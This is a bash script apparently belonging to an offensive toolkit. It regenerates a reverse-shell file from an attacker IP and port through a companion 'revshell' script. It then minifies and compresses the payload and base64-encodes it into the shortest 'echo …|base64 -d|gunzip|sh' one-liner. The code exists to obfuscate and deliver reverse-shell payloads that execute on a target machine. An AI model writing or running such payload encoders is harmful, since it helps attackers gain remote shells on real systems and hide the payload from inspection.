#!/usr/bin/env bash
# Usage: encode <file> [H=<ip>] [P=<port>]
# If H and P are given, regenerates <file> via the revshell script first.
# Minifies (strips indentation + blank lines) then tries every available
# compressor (gzip, xz, bzip2) and emits the shortest one-liner.

FILE="${1:?usage: encode <file> [H=ip] [P=port]}"; shift
H="" P=""
for arg in "$@"; do
  case "$arg" in
    H=*) H="${arg#H=}" ;;
    P=*) P="${arg#P=}" ;;
  esac
done

if [[ -n "$H" && -n "$P" ]]; then
  "$(dirname "$0")/revshell" "$FILE" H="$H" P="$P" >/dev/null \
    || { echo "error: revshell generation failed" >&2; exit 1; }
fi

[[ -f "$FILE" ]] || { echo "error: $FILE not found" >&2; exit 1; }

minified=$(sed 's/^[[:space:]]*//' "$FILE" | grep -v '^[[:space:]]*$')

try() {
  local cmd="$1" dec="$2"
  command -v "$cmd" &>/dev/null || return
  local payload line
  payload=$(printf '%s\n' "$minified" | "$cmd" -9c | base64 | tr -d '\n')
  line="echo ${payload}|base64 -d|${dec}|sh"
  printf '[%s %d chars] %s\n' "$cmd" "${#line}" "$line"
}

try gzip  gunzip
try xz    "xz -d"
try bzip2 bunzip2
